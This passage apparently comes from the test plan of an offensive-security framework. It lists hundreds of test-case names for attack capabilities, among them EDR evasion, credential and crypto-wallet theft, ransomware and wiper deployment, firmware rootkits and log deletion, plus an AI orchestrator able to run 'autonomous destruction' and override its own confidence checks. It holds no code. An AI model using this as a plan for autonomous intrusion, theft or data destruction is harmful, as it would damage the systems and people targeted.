├── TC-073  Sleep masking Module Stomping       → Sleep success
├── TC-074  Sleep masking Exception Handler     → Sleep success
├── TC-075  AMSI bypass                         → Bypass success
├── TC-076  ETW tampering                       → Tamper success
├── TC-077  Anti-debug detection                → Detection success
├── TC-078  Anti-VM detection                   → Detection success
└── TC-079  Anti-sandbox detection              → Detection success

LAYER 7 - AD ATTACK:
├── TC-080  Kerberoasting                       → Hash extraction
├── TC-081  AS-REP Roast                        → Hash extraction
├── TC-082  Golden Ticket                      → Authentication success
├── TC-083  Silver Ticket                      → Service access
├── TC-084  ADCS ESC1                          → Certificate enrollment
├── TC-085  ADCS ESC4                          → Certificate abuse
├── TC-086  DCSync                             → Hash extraction
├── TC-087  DCShadow                           → DC replication
├── TC-088  Unconstrained Delegation            → TGT capture
├── TC-089  Constrained Delegation              → Service access
├── TC-090  Resource-Based Constrained Delegation│ → Computer creation
├── TC-091  Shadow Credentials                  → Certificate abuse
├── TC-092  SID History Injection               → Privilege escalation
├── TC-093  PrinterBug / PetitPotam             → NTLM relay
├── TC-094  ZeroLogon                          → DC compromise
└── TC-095  PrintNightmare                     → RCE

LAYER 8 - LATERAL MOVEMENT:
├── TC-096  Pass-the-Hash                       → Authentication success
├── TC-097  Pass-the-Ticket                     → Authentication success
├── TC-098  Overpass-the-Hash                   → Ticket creation
├── TC-099  WMI execution                       → Command execution
├── TC-100  WinRM execution                     → Command execution
├── TC-101  PSRemoting                          → Command execution
├── TC-102  SMB execution                       → Command execution
├── TC-103  DCOM execution                      → Command execution
├── TC-104  GPO abuse                           → Privilege escalation
├── TC-105  ACL abuse                           → Privilege escalation
├── TC-106  RBCD abuse                          → Computer creation
├── TC-107  Shadow Credentials lateral           → Certificate abuse
├── TC-108  Print Spooler abuse                 → RCE
├── TC-109  BITS job abuse                      → Execution
├── TC-110  Scheduled task lateral              → Execution
├── TC-111  Service abuse lateral               → Execution
├── TC-112  Registry lateral                    → Execution
├── TC-113  WMI lateral                         → Execution
├── TC-114  DCOM lateral                        → Execution
├── TC-115  CIM lateral                         → Execution
├── TC-116  SSH lateral                         → Execution
├── TC-117  PsExec                              → Execution
├── TC-118  WMIC                                → Execution
├── TC-119  WinRM                               → Execution
├── TC-120  SMB lateral                         → Execution
├── TC-121  Named pipe lateral                  → Execution
├── TC-122  IPC$ lateral                        → Execution
├── TC-123  Admin$ lateral                      → Execution
├── TC-124  C$ lateral                          → Execution
└── TC-125  Lateral movement chain              → Full chain success

LAYER 9 - PERSISTENCE:
├── TC-126  Registry Run key                    → Persistence success
├── TC-127  Scheduled task                      → Persistence success
├── TC-128  Service creation                    → Persistence success
├── TC-129  WMI event subscription              → Persistence success
├── TC-130  Startup folder                      → Persistence success
├── TC-131  DLL hijacking                       → Persistence success
├── TC-132  COM object hijacking                → Persistence success
├── TC-133  AppInit DLLs                        → Persistence success
├── TC-134  Image File Execution Options        → Persistence success
├── TC-135  Accessibility features              → Persistence success
├── TC-136  Netsh helper DLL                    → Persistence success
├── TC-137  Linux crontab                       → Persistence success
├── TC-138  Linux systemd service               → Persistence success
├── TC-139  Linux .bashrc                        → Persistence success
├── TC-140  Linux SSH keys                       → Persistence success
├── TC-141  macOS Launch Agent                  → Persistence success
├── TC-142  macOS Launch Daemon                 → Persistence success
├── TC-143  macOS Login Item                    → Persistence success
├── TC-144  Android Accessibility Service       → Persistence success
├── TC-145  Android Device Admin                → Persistence success
├── TC-146  Re-persist mechanism                → Re-persist success
└── TC-147  Full persistence chain              → Full chain success

LAYER 10 - HARDWARE ROOTKIT:
├── TC-148  UEFI DXE driver injection           → Persistence success
├── TC-149  Boot chain hook                     → Pre-OS execution
├── TC-150  Secure Boot bypass (MOK)            → Boot success
├── TC-151  SMM handler inject                  → Ring -2 execution
├── TC-152  SPI flash read/write                → Firmware access
├── TC-153  JTAG debug                          → Hardware debug
├── TC-154  UART console                        → Serial access
├── TC-155  Firmware emulation                  → Firmware analysis
├── TC-156  OSL hook                            → Boot persistence
├── TC-157  CM hook                             → Boot persistence
├── TC-158  MOK enroll                          → Boot persistence
├── TC-159  Self-reinstall                      → Persistence success
├── TC-160  ESP persistence                     → Boot persistence
├── TC-161  Shim exploit                        → Boot persistence
├── TC-162  SMRAM exploit                       → Ring -2 execution
├── TC-163  ROP chain                           → Ring -2 execution
├── TC-164  Interrupt hook                      → Ring -2 execution
├── TC-165  SMM self-reinstall                  → Persistence success
├── TC-166  SPI flash read                      → Firmware read
├── TC-167  SPI flash write                     → Firmware write
├── TC-168  JTAG debug enabled                  → Hardware access
├── TC-169  UART console access                 → Serial access
├── TC-170  Firmware emulation success          → Firmware analysis
└── TC-171  Full hardware rootkit chain         → Full chain success
```

### Layer 11-15: Credential, Collector, Destruction, Orchestrator, Brain

```
LAYER 11 - CREDENTIAL THEFT:
├── TC-172  LSASS fork dump                     → Credential extraction
├── TC-173  LSASS minidump                      → Credential extraction
├── TC-174  LSASS procdump                      → Credential extraction
├── TC-175  LSASS nanodump                      → Credential extraction
├── TC-176  LSASS PPL bypass                    → Credential extraction
├── TC-177  LSASS SSP injection                 → Credential extraction
├── TC-178  LSASS hooking                       → Credential extraction
├── TC-179  SAM registry dump                   → Credential extraction
├── TC-180  SAM hive extract                    → Credential extraction
├── TC-181  SAM VSS extract                     → Credential extraction
├── TC-182  Chrome password extraction           → Credential extraction
├── TC-183  Firefox password extraction          → Credential extraction
├── TC-184  Edge password extraction             → Credential extraction
├── TC-185  Brave password extraction            → Credential extraction
├── TC-186  Opera password extraction            → Credential extraction
├── TC-187  MetaMask wallet extraction           → Wallet access
├── TC-188  Phantom wallet extraction            → Wallet access
├── TC-189  Exodus wallet extraction             → Wallet access
├── TC-190  Atomic wallet extraction             → Wallet access
├── TC-191  Electrum wallet extraction           → Wallet access
├── TC-192  Steam credentials extraction         → Account access
├── TC-193  Epic credentials extraction          → Account access
├── TC-194  Origin credentials extraction        → Account access
├── TC-195  NordVPN credentials extraction       → VPN access
├── TC-196  ExpressVPN credentials extraction    → VPN access
├── TC-197  Surfshark credentials extraction     → VPN access
├── TC-198  AWS credential extraction            → Cloud access
├── TC-199  Azure credential extraction          → Cloud access
├── TC-200  GCP credential extraction            → Cloud access
├── TC-201  Token impersonation                  → Privilege escalation
├── TC-202  Token delegation                     → Privilege escalation
├── TC-203  Token primary                        → Authentication success
├── TC-204  Certificate store extraction         → Certificate access
├── TC-205  Smartcard extraction                 → Certificate access
├── TC-206  Instagram session extraction         → Account access
├── TC-207  TikTok session extraction            → Account access
├── TC-208  X session extraction                 → Account access
├── TC-209  Spotify session extraction           → Account access
├── TC-210  MFA TOTP token extraction            → MFA bypass
├── TC-211  FaceID bypass                        → Biometric bypass
├── TC-212  TouchID bypass                       → Biometric bypass
├── TC-213  Fingerprint bypass                   → Biometric bypass
├── TC-214  Coinbase exchange extraction          → Exchange access
├── TC-215  Binance exchange extraction           → Exchange access
├── TC-216  Kraken exchange extraction            → Exchange access
├── TC-217  Bybit exchange extraction             → Exchange access
└── TC-218  Full credential chain                → Full chain success

LAYER 12 - COLLECTOR:
├── TC-219  Chrome browser data                  → Data extraction
├── TC-220  Firefox browser data                 → Data extraction
├── TC-221  Edge browser data                    → Data extraction
├── TC-222  Opera browser data                   → Data extraction
├── TC-223  Screen capture (JPEG/PNG)            → Image capture
├── TC-224  Screen record (MP4)                  → Video capture
├── TC-225  Keylog capture                       → Keystroke capture
├── TC-226  WiFi credential extraction           → WiFi access
├── TC-227  Webcam photo capture                 → Image capture
├── TC-228  Microphone audio recording           → Audio capture
├── TC-229  Clipboard monitoring                 → Clipboard data
├── TC-230  Document grabber (PDF/DOCX/XLSX)     → File extraction
├── TC-231  Email grabber (PST/OST)              → File extraction
├── TC-232  Chat grabber (Discord/Slack)         → File extraction
├── TC-233  Messaging grabber (WhatsApp/Signal)  → File extraction
├── TC-234  Network packet capture (PCAP)        → Network data
└── TC-235  Full collector chain                 → Full chain success

LAYER 13 - DESTRUCTION:
├── TC-236  Database DROP SCHEMA                 → Schema deleted
├── TC-237  Database DROP FK                     → Foreign keys deleted
├── TC-238  JADEPUFFER AES_ENCRYPT               → Data encrypted
├── TC-239  MAD-CAT data corruption              → Data corrupted
├── TC-240  Database delete backup               → Backup deleted
├── TC-241  Database disable recovery            → Recovery disabled
├── TC-242  Ransomware file encryption           → Files encrypted
├── TC-243  Ransomware database encryption       → Database encrypted
├── TC-244  Ransomware ransom note               → Note created
├── TC-245  Ransomware key destroy               → Key destroyed
├── TC-246  Lotus zero overwrite                 → Data destroyed
├── TC-247  PathWiper random overwrite           → Data destroyed
├── TC-248  MBR destroy                          → Boot failure
├── TC-249  MFT destroy                          → File system failure
├── TC-250  Volume dismount                      → Volume dismounted
├── TC-251  Restore point delete                 → Restore points deleted
├── TC-252  USN Journal clear                    → Journal cleared
├── TC-253  Service stop                         → Service down
├── TC-254  Process kill                         → Process terminated
├── TC-255  Network flood                        → Network overwhelmed
├── TC-256  Impact calculator                    → Blast radius calc
├── TC-257  Recovery time estimate               → Time estimated
├── TC-258  Business impact assessment           → Impact assessed
├── TC-259  P0/P1 scoring                        → Score calculated
└── TC-260  Full destruction chain               → Full chain success

LAYER 14 - ORCHESTRATOR:
├── TC-261  LangGraph intent classification      → Classification success
├── TC-262  LangGraph route to agent             → Route success
├── TC-263  MCP server connection                → Connection success
├── TC-264  MCP tool execution                   → Execution success
├── TC-265  Fireteam parallel execution          → Parallel success
├── TC-266  Fireteam task distribution           → Distribution success
├── TC-267  Task queue management                → Queue success
├── TC-268  Task scheduling                      → Schedule success
├── TC-269  Result collection                    → Collection success
├── TC-270  State management                     → Management success
├── TC-271  State recovery                       → Recovery success
├── TC-272  Error handling                       → Error handled
├── TC-273  Timeout handling                     → Timeout handled
├── TC-274  Retry logic                          → Retry success
├── TC-275  Fallback logic                       → Fallback success
├── TC-276  Logging                              → Log success
├── TC-277  Metrics collection                   → Metrics collected
├── TC-278  Alert generation                     → Alert generated
├── TC-279  Dashboard update                     → Dashboard updated
├── TC-280  Report generation                    → Report generated
└── TC-281  Full orchestrator chain              → Full chain success

LAYER 15 - BRAIN:
├── TC-282  Autonomous decision making           → Decision made
├── TC-283  Risk assessment                      → Risk calculated
├── TC-284  Behavior learning                    → Learning success
├── TC-285  Timing control                       → Timing controlled
├── TC-286  Decision confidence check            → Confidence checked
├── TC-287  Operator approval request            → Approval requested
├── TC-288  Default decision fallback            → Fallback used
├── TC-289  Learning reset                       → Learning reset
├── TC-290  Baseline restoration                 → Baseline restored
├── TC-291  Timing default                       → Default timing used
├── TC-292  Risk pause                           → Execution paused
├── TC-293  Risk continue                        → Execution continued
├── TC-294  Confidence override                  → Override applied
├── TC-295  Operator override                    → Override applied
├── TC-296  Emergency stop                       → Execution stopped
├── TC-297  Emergency resume                     → Execution resumed
├── TC-298  Learning corruption recovery         → Recovery success
├── TC-299  Timing failure recovery              → Recovery success
├── TC-300  Decision audit                       → Audit success
└── TC-301  Full brain chain                     → Full chain success
```

### Layer 16-21: Infra, OSINT, Exploit, Evidence, Report, Cleanup

```
LAYER 16 - INFRASTRUCTURE:
├── TC-302  Terraform VPS provisioning           → VPC created
├── TC-303  Ansible playbook execution           → Config applied
├── TC-304  Nginx redirector setup               → Traffic routed
├── TC-305  WireGuard VPN connection             → Tunnel established
├── TC-306  IP rotation (1-3s)                   → IP changed
├── TC-307  VPC failover                         → Backup VPC active
├── TC-308  SSL certificate setup                → Certificate installed
├── TC-309  Firewall rules                       → Rules applied
├── TC-310  DNS configuration                    → DNS configured
├── TC-311  Proxy chain setup                    → Proxy chain active
├── TC-312  TLS fingerprint spoofing             → Fingerprint changed
├── TC-313  UA rotation                          → UA changed
├── TC-314  Rate limiting                        → Rate limited
├── TC-315  Header validation                    → Headers validated
├── TC-316  Decoy site deployment                → Decoy deployed
├── TC-317  Monitoring setup                     → Monitoring active
├── TC-318  Backup infrastructure                → Backup created
├── TC-319  Recovery procedure                   → Recovery tested
├── TC-320  Cleanup procedure                    → Cleanup tested
└── TC-321  Full infrastructure chain            → Full chain success

LAYER 17 - OSINT:
├── TC-322  Subdomain enumeration                → Subdomains found
├── TC-323  Reverse DNS                          → DNS records found
├── TC-324  Zone transfer                        → Zone transferred
├── TC-325  Subdomain brute-force                → Subdomains found
├── TC-326  DNS history                          → History found
├── TC-327  TCP/UDP scan                         → Open ports found
├── TC-328  Service fingerprint                  → Services identified
├── TC-329  Banner grab                          → Banner captured
├── TC-330  Network map                          → Network mapped
├── TC-331  Tech fingerprint                     → Technologies identified
├── TC-332  WAF detect                           → WAF detected
├── TC-333  CMS/framework detect                 → CMS identified
├── TC-334  SSL cert info                        → Cert info found
├── TC-335  Robots.txt                           → Paths found
├── TC-336  Email harvest                        → Emails found
├── TC-337  Social media recon                   → Profiles found
├── TC-338  Git recon                            → Repos found
├── TC-339  LinkedIn recon                       → Profiles found
├── TC-340  Breach data                          → Breaches found
├── TC-341  ASN lookup                           → ASN found
├── TC-342  Netblock enumeration                 → Netblocks found
├── TC-343  Cert transparency                    → Certs found
├── TC-344  crt.sh                               → Certs found
├── TC-345  Shodan                               → Devices found
├── TC-346  AWS bucket enumeration               → Buckets found
├── TC-347  Azure blob enumeration               → Blobs found
├── TC-348  GCP bucket enumeration               → Buckets found
├── TC-349  Public S3 enumeration                → S3 found
└── TC-350  Full OSINT chain                     → Full chain success

LAYER 18 - EXPLOITATION:
├── TC-351  XSS reflected                        → Alert executed
├── TC-352  XSS stored                           → Alert on load
├── TC-353  XSS DOM                              → Alert executed
├── TC-354  XSS blind                            → Alert confirmed
├── TC-355  XSS polyglot                         → Payload executed
├── TC-356  XSS cookie steal                     → Cookie stolen
├── TC-357  SSRF internal scan                   → Internal IP found
├── TC-358  SSRF cloud metadata                  → Metadata leaked
├── TC-359  SSRF file read                       → File contents
├── TC-360  SSRF port scan                       → Open ports found
├── TC-361  RCE command injection                → Command executed
├── TC-362  RCE code injection                   → Code executed
├── TC-363  RCE deserialization                  → Code executed
├── TC-364  RCE SSTI                             → Template executed
├── TC-365  LFI file read                        → File contents
├── TC-366  LFI file write                       → File written
├── TC-367  RFI remote include                   → Code included
├── TC-368  GraphQL introspection                → Schema leaked
├── TC-369  GraphQL nested query                 → DoS success
├── TC-370  GraphQL injection                    → Injection success
├── TC-371  API parameter injection              → Injection success
├── TC-372  API JSON injection                   → Injection success
├── TC-373  API XML injection                    → Injection success
├── TC-374  CVE scanner                          → CVEs found
├── TC-375  CVE exploiter                        → Exploitation success
├── TC-376  Exploit DB                           → Exploits found
└── TC-377  Full exploitation chain              → Full chain success

LAYER 19 - FORENSIC EVIDENCE:
├── TC-378  Hash chain creation                  → Chain valid
├── TC-379  Timestamp creation                   → Timestamp valid
├── TC-380  Sequence creation                    → Sequence valid
├── TC-381  Parent-child relationship            → Relationship valid
├── TC-382  Digital signature                    → Signature valid
├── TC-383  Request/response capture             → Data captured
├── TC-384  Screenshot capture                   → Image saved
├── TC-385  Diff comparison                      → Diff generated
├── TC-386  Telemetry reference                  → Reference created
├── TC-387  PII filter                           → PII removed
├── TC-388  Secret filter                        → Secrets removed
├── TC-389  Token filter                         → Tokens removed
├── TC-390  Cert filter                          → Certs removed
├── TC-391  Local storage                        → Data stored
├── TC-392  Encrypted storage                    → Data encrypted
├── TC-393  S3 upload                            → Data uploaded
├── TC-394  Independent verify                   → Verification passed
├── TC-395  Replay verify                        → Verification passed
├── TC-396  Integrity check                      → Check passed
└── TC-397  Full evidence chain                  → Full chain success

LAYER 20 - REPORTING:
├── TC-398  Full technical report                → Report generated
├── TC-399  Executive summary                    → Summary created
├── TC-400  Findings list                        → Findings listed
├── TC-401  Evidence collection                  → Evidence collected
├── TC-402  Reproduction steps                   → Steps documented
├── TC-403  Remediation steps                    → Steps documented
├── TC-404  Timeline creation                    → Timeline created
├── TC-405  Risk score calculation               → Score calculated
├── TC-406  Business impact assessment           → Impact assessed
├── TC-407  ROI calculation                      → ROI calculated
├── TC-408  JSON export                          → JSON exported
├── TC-409  Markdown export                      → Markdown exported
├── TC-410  PDF export                           → PDF exported
├── TC-411  Encrypted export                     → Encrypted exported
└── TC-412  Full reporting chain                 → Full chain success

LAYER 21 - CLEANUP:
├── TC-413  Credential revocation                → Creds revoked
├── TC-414  Token rotation                       → Tokens rotated
├── TC-415  SSH key deletion                     → Keys deleted
├── TC-416  Tool deletion                        → Tools deleted
├── TC-417  Log deletion                         → Logs deleted
├── TC-418  Config deletion                      → Configs deleted
├── TC-419  Backup deletion                      → Backups deleted
├── TC-420  Java object deletion                 → Objects deleted
├── TC-421  Stored proc deletion                 → Procs deleted
├── TC-422  Admin account deletion               → Accounts deleted
├── TC-423  Revert changes                       → Changes reverted
├── TC-424  Cache scan                           → Cache scanned
├── TC-425  Cache verify                         → Cache clean
├── TC-426  Manifest generation                  → Manifest created
├── TC-427  Manifest verify                      → Manifest verified
├── TC-428  Manifest export                      → Manifest exported
└── TC-429  Full cleanup chain                   → Full chain success
```

### Layer 22-25: Auth Bypass, Network Evasion, Destruction Chain, Implant

```
LAYER 22 - AUTH BYPASS:
├── TC-430  Hashcat hash crack                   → Password found
├── TC-431  John hash crack                      → Password found
├── TC-432  JWT alg:none bypass                  → Auth bypassed
├── TC-433  JWT weak secret crack                → Secret found
├── TC-434  JWT kid injection                    → Auth bypassed
├── TC-435  JWT key confusion                    → Auth bypassed
├── TC-436  Default credential login             → Access gained
├── TC-437  OAuth manipulation                   → Access gained
├── TC-438  Session hijack                       → Session hijacked
├── TC-439  SQLi auth bypass                     → Auth bypassed
├── TC-440  NoSQL auth bypass                    → Auth bypassed
├── TC-441  JSON tampering                       → Auth bypassed
├── TC-442  HTTP bruteforce                      → Password found
├── TC-443  Credential stuffing                  → Valid creds found
├── TC-444  Password spraying                    → Valid creds found
├── TC-445  Rate limit bypass                    → Limit bypassed
├── TC-446  User enum                            → Users enumerated
├── TC-447  API key extraction                   → Key extracted
├── TC-448  API key reuse                        → Access gained
└── TC-449  Full auth bypass chain               → Full chain success

LAYER 23 - NETWORK EVASION:
├── TC-450  IP rotation                          → IP changed
├── TC-451  Traffic morph                        → Traffic changed
├── TC-452  HTTP/2 fingerprint spoof             → Fingerprint changed
├── TC-453  TLS fingerprint spoof                → Fingerprint changed
├── TC-454  Sleep jitter                         → Jitter applied
├── TC-455  Payload encryption                   → Payload encrypted
├── TC-456  DNS tunnel                           → Tunnel established
├── TC-457  HTTP tunnel                          → Tunnel established
├── TC-458  ICMP tunnel                          → Tunnel established
├── TC-459  WebSocket tunnel                     → Tunnel established
├── TC-460  Domain fronting (Cloudflare)         → Traffic routed
├── TC-461  Domain fronting (CloudFront)         → Traffic routed
├── TC-462  Domain fronting (Azure CDN)          → Traffic routed
├── TC-463  Proxy chain                          → Chain established
├── TC-464  VPN connection                       → VPN established
└── TC-465  Full network evasion chain           → Full chain success

LAYER 24 - DESTRUCTION CHAIN:
├── TC-466  Impact calculator                    → Blast radius calc
├── TC-467  Destruction chain                    → Chain completed
├── TC-468  Full scope attack                    → Recon→Attack→Destroy→Report
├── TC-469  Ransomware deployment                → Ransomware deployed
├── TC-470  Wiper deployment                     → Wiper deployed
├── TC-471  DB drop deployment                   → DB dropped
├── TC-472  Timing chain                         → Timing chain executed
├── TC-473  Autonomous destruction               → Destruction completed
├── TC-474  Partial destruction                  → Partial completed
├── TC-475  Recovery time estimation             → Time estimated
├── TC-476  Business impact assessment           → Impact assessed
├── TC-477  P0/P1 scoring                        → Score calculated
├── TC-478  Evidence collection                  → Evidence collected
├── TC-479  Report generation                    → Report generated
└── TC-480  Full destruction chain               → Full chain success

LAYER 25 - IMPLANT GENERATOR:
├── TC-481  Binary generation (.exe)             → Binary generated
├── TC-482  Binary generation (.bin)             → Binary generated
├── TC-483  Key encryption                       → Encryption applied
├── TC-484  Beacon registration                  → Registration success
├── TC-485  Beacon check-in                      → Check-in success
├── TC-486  Beacon send result                   → Result sent
├── TC-487  Payload encryption                   → Payload encrypted
├── TC-488  Shellcode encryption                 → Shellcode encrypted
├── TC-489  AV detection test                    → Bypass success
├── TC-490  EDR detection test                   → Bypass success
├── TC-491  Fallback channel                     → Channel rotated
├── TC-492  Environment detection                → Environment detected
├── TC-493  Resilience test                      → Resilience verified
├── TC-494  Self-destruct test                   → Self-destruct verified
└── TC-495  Full implant chain                   → Full chain success
```

### Layer 26-40: Container, Cloud, SE, Wireless, Supply Chain, API, Mobile, Physical, Purple Team, Threat Intel, IR, Zero Trust, Web3, Malware, AI/ML

```
LAYER 26 - CONTAINER/K8S:
├── TC-496  Docker socket mount                  → Container escape
├── TC-497  Docker container escape              → Host access
├── TC-498  Docker secret extraction             → Secrets extracted
├── TC-499  Docker network sniffing              → Traffic captured
├── TC-500  Docker build injection               → Backdoor deployed
├── TC-501  Docker registry poisoning            → Image poisoned
├── TC-502  Docker compose manipulation          → Config changed
├── TC-503  Docker inventory                     → Containers enumerated
├── TC-504  K8s API access                       → API accessed
├── TC-505  K8s etcd dump                        → Secrets extracted
├── TC-506  K8s secrets extraction               → Secrets extracted
├── TC-507  K8s configmap read                   → ConfigMaps read
├── TC-508  K8s RBAC privesc                     → Privilege escalated
├── TC-509  K8s service account abuse            → Token abused
├── TC-510  K8s pod injection                    → Pod injected
├── TC-511  K8s node shell                       → Node accessed
├── TC-512  K8s network policy bypass            → Policy bypassed
├── TC-513  K8s admission controller bypass      → Controller bypassed
├── TC-514  K8s CronJob persistence              → Persistence established
├── TC-515  K8s Helm chart poisoning             → Chart poisoned
├── TC-516  Container privesc (cap_sys_admin)    → Privilege escalated
├── TC-517  Container privesc (privileged)        → Privilege escalated
├── TC-518  Container privesc (hostPID)           → Privilege escalated
├── TC-519  Container privesc (hostIPC)           → Privilege escalated
├── TC-520  Container privesc (hostNetwork)       → Privilege escalated
├── TC-521  Container privesc (hostPath)          → Privilege escalated
└── TC-522  Full container chain                 → Full chain success

LAYER 27 - CLOUD DEEP:
├── TC-523  AWS IAM privesc                      → Privilege escalated
├── TC-524  AWS IAM user creation                → User created
├── TC-525  AWS IAM role creation                → Role created
├── TC-526  AWS Lambda function creation         → Function created
├── TC-527  AWS S3 bucket policy                 → Policy changed
├── TC-528  AWS EC2 instance creation            → Instance created
├── TC-529  AWS EBS volume snapshot              → Snapshot created
├── TC-530  AWS RDS snapshot                     → Snapshot created
├── TC-531  AWS Secrets Manager                  → Secrets extracted
├── TC-532  AWS Systems Manager                  → Session established
├── TC-533  AWS CloudFormation                   → Stack created
├── TC-534  AWS CodePipeline                     → Pipeline compromised
├── TC-535  AWS Glue job                         → Job created
├── TC-536  AWS EMR cluster                      → Cluster accessed
├── TC-537  AWS Redshift                         → Cluster accessed
├── TC-538  AWS Athena                           → Query executed
├── TC-539  AWS KMS key                          → Key accessed
├── TC-540  AWS STS assume role                  → Role assumed
├── TC-541  AWS cross-account access             → Access gained
├── TC-542  AWS metadata service                 → Credentials extracted
├── TC-543  Azure AD privesc                     → Privilege escalated
├── TC-544  Azure user creation                  → User created
├── TC-545  Azure role assignment                → Role assigned
├── TC-546  Azure function creation              → Function created
├── TC-547  Azure blob storage                   → Data accessed
├── TC-548  Azure VM creation                    → VM created
├── TC-549  Azure disk snapshot                  → Snapshot created
├── TC-550  Azure SQL                            → Database accessed
├── TC-551  Azure Key Vault                      → Secrets extracted
├── TC-552  Azure Automation                     → Runbook created
├── TC-553  Azure DevOps                         → Pipeline compromised
├── TC-554  Azure Logic App                      → App modified
├── TC-555  Azure App Service                    → App modified
├── TC-556  Azure Cosmos DB                      → Database accessed
├── TC-557  Azure Data Lake                      → Data accessed
├── TC-558  Azure Synapse                        → Workspace accessed
├── TC-559  Azure Databricks                     → Workspace accessed
├── TC-560  Azure managed identity               → Identity abused
├── TC-561  Azure federated identity              → Identity abused
├── TC-562  Azure metadata service               → Credentials extracted
├── TC-563  GCP IAM privesc                      → Privilege escalated
├── TC-564  GCP user creation                    → User created
├── TC-565  GCP role assignment                  → Role assigned
├── TC-566  GCP function creation                → Function created
├── TC-567  GCP storage bucket                   → Data accessed
├── TC-568  GCP compute instance                 → Instance created
├── TC-569  GCP disk snapshot                    → Snapshot created
├── TC-570  GCP Cloud SQL                        → Database accessed
├── TC-571  GCP Secret Manager                   → Secrets extracted
├── TC-572  GCP Cloud Functions                  → Function created
├── TC-573  GCP Cloud Build                      → Build triggered
├── TC-574  GCP Dataflow                         → Pipeline created
├── TC-575  GCP Dataproc                         → Cluster accessed
├── TC-576  GCP BigQuery                         → Dataset accessed
├── TC-577  GCP Spanner                          → Database accessed
├── TC-578  GCP Firestore                        → Data accessed
├── TC-579  GCP Pub/Sub                          → Topic accessed
├── TC-580  GCP metadata service                 → Credentials extracted
└── TC-581  Full cloud chain                     → Full chain success

LAYER 28 - SOCIAL ENGINEERING:
├── TC-582  Email phishing                       → Credentials harvested
├── TC-583  Spear phishing                       → Credentials harvested
├── TC-584  Vishing                              → Information gathered
├── TC-585  Smishing                             → Credentials harvested
├── TC-586  QR phishing                          → Credentials harvested
├── TC-587  Pretexting (IT support)              → Information gathered
├── TC-588  Pretexting (vendor)                  → Information gathered
├── TC-589  Pretexting (new employee)            → Information gathered
├── TC-590  Pretexting (executive)               → Information gathered
├── TC-591  Pretexting (delivery)                → Physical access gained
├── TC-592  OSINT (email harvest)                → Emails found
├── TC-593  OSINT (social media)                 → Profiles found
├── TC-594  OSINT (Git recon)                    → Repos found
├── TC-595  OSINT (LinkedIn)                     → Profiles found
├── TC-596  OSINT (breach data)                  → Breaches found
├── TC-597  OSINT (company info)                 → Info gathered
├── TC-598  Campaign setup                       → Campaign created
├── TC-599  Campaign execution                   → Campaign executed
├── TC-600  Campaign tracking                    → Tracking active
├── TC-601  Campaign reporting                   → Report generated
├── TC-602  Physical access                      → Access gained
├── TC-603  Physical social engineering          → Info gathered
├── TC-604  Full social engineering chain        → Full chain success

LAYER 29 - WIRELESS:
├── TC-605  WiFi deauth attack                   → Deauth success
├── TC-606  WiFi handshake capture               → Handshake captured
├── TC-607  WiFi PMKID attack                    → PMKID captured
├── TC-608  WiFi evil twin                       → Evil twin deployed
├── TC-609  WiFi KRACK attack                    → Attack success
├── TC-610  WiFi Dragonblood attack              → Attack success
├── TC-611  WiFi Karma attack                    → Karma deployed
├── TC-612  WiFi/WPA3 attack                     → Attack success
├── TC-613  Bluetooth sniffing                   → Traffic captured
├── TC-614  Bluetooth pairing attack             → Pairing success
├── TC-615  BLE replay attack                    → Replay success
├── TC-616  BLE man-in-the-middle                → MITM success
├── TC-617  BLE spam attack                      → Spam success
├── TC-618  RFID clone (Proxmark3)               → Badge cloned
├── TC-619  RFID emulate                         → Badge emulated
├── TC-620  NFC sniffing                         → Data captured
├── TC-621  NFC relay attack                     → Relay success
├── TC-622  WiFi Pineapple deployment            → Rogue AP deployed
├── TC-623  WiFi audit                           → Audit completed
├── TC-624  WiFi assessment                      → Assessment completed
├── TC-625  WiFi penetration test                → Pen test completed
├── TC-626  Full wireless chain                  → Full chain success

LAYER 30 - SUPPLY CHAIN:
├── TC-627  Dependency confusion                  → Confusion success
├── TC-628  Typosquatting                         → Package published
├── TC-629  Namespace confusion                   → Confusion success
├── TC-630  Malicious package                     → Package published
├── TC-631  Version manipulation                  → Version changed
├── TC-632  Maintainer takeover                   → Takeover success
├── TC-633  CI/CD pipeline compromise             → Pipeline compromised
├── TC-634  CI/CD secret extraction               → Secrets extracted
├── TC-635  CI/CD code injection                  → Code injected
├── TC-636  CI/CD artifact manipulation           → Artifact manipulated
├── TC-637  CI/CD build poisoning                 → Build poisoned
├── TC-638  CI/CD deployment hijack               → Deployment hijacked
├── TC-639  Package registry abuse                → Registry abused
├── TC-640  Package signing bypass                → Signing bypassed
├── TC-641  Package integrity bypass              → Integrity bypassed
├── TC-642  Package version abuse                 → Version abused
├── TC-643  Build system compromise               → System compromised
├── TC-644  Build dependency abuse                → Dependency abused
├── TC-645  Build artifact manipulation           → Artifact manipulated
├── TC-646  Build signature bypass                → Signature bypassed
├── TC-647  Full supply chain chain               → Full chain success

LAYER 31 - API SECURITY:
├── TC-648  OAuth redirect URI manipulation       → Redirect success
├── TC-649  OAuth scope escalation                → Scope escalated
├── TC-650  OAuth token theft                     → Token stolen
├── TC-651  JWT alg:none                          → Auth bypassed
├── TC-652  JWT weak secret                       → Secret cracked
├── TC-653  JWT kid injection                     → Auth bypassed
├── TC-654  JWT key confusion                     → Auth bypassed
├── TC-655  API key extraction                    → Key extracted
├── TC-656  Rate limit bypass                     → Limit bypassed
├── TC-657  Price manipulation                    → Price changed
├── TC-658  Quantity manipulation                 → Quantity changed
├── TC-659  IDOR                                 → Access gained
├── TC-660  Function leak                         → Function found
├── TC-661  Workflow abuse                        → Workflow bypassed
├── TC-662  NoSQL API injection                   → Injection success
├── TC-663  GraphQL introspection                 → Schema leaked
├── TC-664  GraphQL depth abuse                   → DoS success
├── TC-665  XML entity injection                  → XXE success
├── TC-666  JSON injection                        → Injection success
└── TC-667  Full API security chain               → Full chain success

LAYER 32 - MOBILE:
├── TC-668  iOS keychain dump                     → Credentials extracted
├── TC-669  iOS jailbreak detection bypass        → Bypass success
├── TC-670  iOS SSL pinning bypass                → Bypass success
├── TC-671  iOS backup extraction                 → Data extracted
├── TC-672  iOS plist dump                        → Data extracted
├── TC-673  iOS scheme abuse                      → Scheme hijacked
├── TC-674  iOS webview attack                    → Attack success
├── TC-675  iOS pasteboard hijack                 → Data stolen
├── TC-676  iOS notification hijack               → Notifications intercepted
├── TC-677  iOS app cloning                       → App cloned
├── TC-678  Android Magisk hide bypass            → Bypass success
├── TC-679  Android root detection bypass         → Bypass success
├── TC-680  Android SSL pinning bypass            → Bypass success
├── TC-681  Android backup extraction             → Data extracted
├── TC-682  Android shared preferences            → Data extracted
